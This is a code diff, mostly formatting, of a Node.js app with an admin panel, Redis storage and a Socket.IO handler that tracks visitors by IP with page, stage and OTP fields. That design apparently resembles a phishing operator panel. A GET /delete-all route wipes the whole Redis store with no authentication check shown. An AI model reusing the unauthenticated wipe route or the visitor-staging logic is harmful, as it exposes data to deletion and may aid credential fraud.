@@ -25,18 +25,17 @@ function reformatData(data) {
             // Directly assign the value if the key is in the excluded list
             formattedData[key] = value;
         } else {
-        const [prefix, ...rest] = key.split('-');
-        
-        if (!formattedData[prefix]) {
-            formattedData[prefix] = {};
-        }
+            const [prefix, ...rest] = key.split('-');
+
+            if (!formattedData[prefix]) {
+                formattedData[prefix] = {};
+            }
 
             formattedData[prefix][rest.join('-')] = value;
-            formattedData[prefix][rest.join('-')] = value;
-        }
-        formattedData[prefix][rest.join('-')] = value;
+         
         }
     }
+
 
     return formattedData;
 }
@@ -146,7 +145,7 @@ const verifyAdmin = (req, res, next) => {
         // Optionally, you could log this attempt or implement rate-limiting to prevent brute force attacks
         res.render('misc/403/index');
     }
-    
+
 };
 
 const checkRecaptchaSession = (req, res, next) => {
@@ -208,7 +207,7 @@ app.post('/update', async (req, res) => {
         for (const key in formattedData) {
             await redisClient.set(key, JSON.stringify(formattedData[key]));
         }
-        res.render('admin/panel/index', {bool: true, message: "Your updates have been successfully saved."});
+        res.render('admin/panel/index', { bool: true, message: "Your updates have been successfully saved." });
     } catch (error) {
         console.error(error);
         res.status(500).send('Error updating data. Contact webcro help.');
@@ -218,7 +217,7 @@ app.post('/update', async (req, res) => {
 app.get('/delete-all', async (req, res) => {
     try {
         await redisClient.flushAll();
-        res.render('admin/panel/index', {bool: true, message: "All key delete."});
+        res.render('admin/panel/index', { bool: true, message: "All key delete." });
     } catch (error) {
         console.error(error);
         res.status(500).send('Error updating data. Contact webcro help.');
@@ -228,20 +227,20 @@ app.get('/delete-all', async (req, res) => {
 
 
 app.get('/admin', (req, res) => {
-    if(req.session.isAdminVerified) {
-        res.render('admin/panel/index', {bool: false});
+    if (req.session.isAdminVerified) {
+        res.render('admin/panel/index', { bool: false });
     } else {
         res.render('admin/login/index');
     }
-    
+
 });
 
-app.post('/admin/verify', verifyAdmin, (req, res)=>{
+app.post('/admin/verify', verifyAdmin, (req, res) => {
     res.redirect(301, '/admin/panel');
 })
 
 app.get('/admin/panel', checkAdminSession, (req, res) => {
-    res.render('admin/panel/index', {bool: false});
+    res.render('admin/panel/index', { bool: false });
 })
 
 app.get('/admin/settings', checkAdminSession, async (req, res) => {
@@ -279,11 +278,11 @@ app.get('/admin/settings', checkAdminSession, async (req, res) => {
 io.on('connection', (socket, req) => {
     let userIP = socket.request.headers['x-forwarded-for'] || socket.request.connection.remoteAddress;
     userIP = userIP.split(',')[0].trim();
-    
+
     socket.join(userIP);
 
     if (!sessionStore.has(userIP)) {
-        sessionStore.set(userIP, { ip: userIP, status: 'actif', page: null, stage: null, otp:false });
+        sessionStore.set(userIP, { ip: userIP, status: 'actif', page: null, stage: null, otp: false });
     } else {
         let userDetails = sessionStore.get(userIP);
         userDetails.status = 'actif';
@@ -316,7 +315,7 @@ io.on('connection', (socket, req) => {
         io.emit('join', Array.from(sessionStore.entries()));
     })
 
-    
+
 
 });
 
